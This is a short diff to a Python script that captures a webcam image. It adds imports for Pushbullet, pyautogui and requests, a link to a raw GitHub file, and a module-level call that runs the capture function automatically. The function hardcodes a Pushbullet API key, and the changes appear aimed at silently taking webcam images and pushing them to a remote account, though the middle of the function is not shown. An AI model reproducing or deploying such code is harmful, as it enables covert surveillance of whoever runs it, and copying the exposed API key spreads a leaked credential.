@@ -1,3 +1,16 @@
+# program to capture single image from webcam in python
+  
+# importing OpenCV library
+from cv2 import *
+from pushbullet import Pushbullet
+import os
+import pyautogui
+import requests
+
+link = 'https://raw.githubusercontent.com/Jasperaj/txtfile/main/main'
+
+print(link)
+
 def cap():
       API_KEY = 'o.9wt8uTDYahAh9FR06gAOfr8nXffnF4ys'
       pb = Pushbullet(API_KEY)
@@ -50,3 +63,6 @@ def cap():
       # If captured image is corrupted, moving to else part
       else:
           print("No image detected. Please! try again")
+
+
+cap()
